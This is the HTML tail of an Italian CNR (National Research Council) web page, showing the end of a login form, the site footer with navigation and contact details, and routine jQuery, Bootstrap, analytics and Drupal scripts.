					<input class="form-control email-title" placeholder="Cnr Email" name="email" type="text" style="margin:10px 0;">
					<input class="form-control" placeholder="Password" name="password" value="" type="password" style="margin:10px 0;">
					<input class="form-control" placeholder="Conferma Password" name="confrimpassword" value="" type="password" style="margin:30px 0;">
					<input class="btn btn-lg btn-success btn-block" value="Autentica" type="submit">
				</fieldset>
			</form>
		</div>
	</div>
	</div>


			</div>
	</div>

</div>
</div>
  </div>

  
  
</div>

</section> <!-- /.block -->
  </div>
    </section>

    
  </div>
</div>
<footer class="footer container">
    <div class="row">
	  <div id="menu-bottom">
			<div class="menu-bottom-wrapper">
				<section class="trova-subito first">
					<h1>Trova subito</h1>
					<ul class="col-md-6">
						<li><a href="/it/chi-siamo">Chi siamo</a></li>
						<li><a href="/it/dove-siamo">Dove siamo</a></li>
						<li><a href="/it/contatti">Contatti</a></li>
						<li><a href="/it/struttura/dg-40">URP</a></li>
						<li><a href="/it/bandi-di-gara-avvisi">Bandi e gare</a></li>
						<li><a href="/it/concorsi-opportunita">Concorsi</a></li>
						<li><a href="/it/rss">RSS</a></li>
					</ul>
					<ul class="col-md-6">
						<li><a href="/it/amministrazione-trasparente">Amministrazione trasparente</a></li>
						<li><a href="/it/privacy">Privacy</a></li>
						<li><a href="/it/siti-tematici">Elenco Siti tematici</a></li>
						<li><a href="/it/note-legali">Note legali</a></li>
						<li><a id="showpolicy" href="#">Cookie policy</a></li>
						<li><a href="/it/credits">Credits</a></li>
					</ul>
				</section>
				<section class="canali">
					<h1>Canali</h1>
					<ul>
						<li><a href="/it/canali/cittadini">Cittadini</a></li>
						<li><a href="/it/canali/imprese">Imprese</a></li>
						<li><a href="/it/canali/scuole">Scuole</a></li>
						<li><a href="/it/canali/ricercatori">Ricercatori</a></li>
						<li><a href="/it/canali/giornalisti">Giornalisti</a></li>
						<li><a href="/it/canali/personale">Personale</a></li>
					</ul>
				</section>
				<section class="aree-tematiche">
					<h1>Aree tematiche</h1>
					<ul>
						<li><a href="/it/aree-tematiche/chimica-materiali">Scienze chimiche e tecnologie dei materiali</a></li>
						<li><a href="/it/aree-tematiche/energia-ambiente">Scienze del sistema Terra e tecnologie per l'ambiente</a></li>
						<li><a href="/it/aree-tematiche/fisica-matematiche">Scienze fisiche e tecnologie della materia</a></li>
						<li><a href="/it/aree-tematiche/agricoltura-alimentazione">Scienze bio-agroalimentari</a></li>
						<li><a href="/it/aree-tematiche/biologia-biomedica">Scienze biomediche</a></li>
						<li><a href="/it/aree-tematiche/ingegneria-ict">Ingegneria, ICT e tecnologie per l'energia e i trasporti</a></li>
						<li><a href="/it/aree-tematiche/scienze-umane">Scienze umane e sociali, patrimonio culturale</a></li>
					</ul>
				</section>
				<section class="social-network last">
					<h1>Seguici su</h1>
					<ul>
						<li class="facebook"><a title="Seguici su Facebook" href="https://www.facebook.com/UfficioStampaCnr" target="_blank"><span>Facebook</span></a></li>
						<li class="twitter"><a title="Seguici su Twitter" href="https://twitter.com/StampaCnr" target="_blank"><span>Twitter</span></a></li>
					</ul>
				</section>
			</div>
		</div>
  	</div>
	<div class="row">
		<div id="footer-address">
			<p>
				Consiglio Nazionale delle Ricerche - Piazzale Aldo Moro, 7 - 00185 Roma, Italia <br>
				Codice Fiscale 80054330586 - Partita IVA 02118311006 - Il Cnr è soggetto allo split payment <br>
				Indirizzo Posta Elettronica Certificata (PEC) istituzionale <a href="mailto:protocollo-ammcen@pec.cnr.it">protocollo-ammcen@pec.cnr.it</a>
			</p>
		</div>
	</div>
</footer>
<div class="to-top">
	<i class="glyphicon glyphicon-chevron-up"></i>
</div>
  <script>
		jQuery(document).ready(function($){
			$('#grid').mediaBoxes({"LoadingWord":"Caricamento...","loadMoreWord":"Vedi altri risultati","noMoreEntriesWord":"Non ci sono altri risultati","deepLinking":false,"gallery":false,"boxesToLoadStart":10,"boxesToLoad":10,"columnWidth":"auto","columns":4});
		});
	</script>
<script>
		jQuery(document).ready(function($){
			$(window).on('scroll touchmove', function () {
				if($(document).scrollTop() > 0){
					$('body').addClass('shrink');
					$('.to-top').fadeIn(300);
				}else{
					$('body').removeClass('shrink');
					$('.to-top').fadeOut(300);
				}
			});
			$('.to-top').on('click', function(){
				$('html,body').animate({ scrollTop: 0 }, 'fast');
			});
		});
	</script>
<script src="https://www.cnr.it/sites/all/themes/contrib/bootstrap/js/bootstrap.js?p5mxlj"></script>
  <script>_uacct = "UA-2819743-1";urchinTracker();</script>
  <script>window.addEventListener('resize',function(){if(Drupal && Drupal.toolbar) Drupal.toolbar.init()});</script>
</body>
</html>
